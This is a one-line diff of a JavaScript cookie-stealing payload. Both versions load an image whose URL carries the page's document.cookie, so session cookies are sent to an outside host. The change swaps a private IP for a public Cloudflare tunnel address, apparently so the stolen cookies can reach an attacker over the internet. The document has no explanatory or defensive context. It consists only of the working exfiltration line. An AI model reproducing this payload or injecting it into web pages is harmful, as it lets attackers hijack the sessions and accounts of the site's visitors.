@@ -1,1 +1,1 @@
-new Image().src='https://192.168.170.80:9090/?c='+encodeURIComponent(document.cookie)
+new Image().src='https://walked-premiere-issued-advertise.trycloudflare.com/?c='+encodeURIComponent(document.cookie);
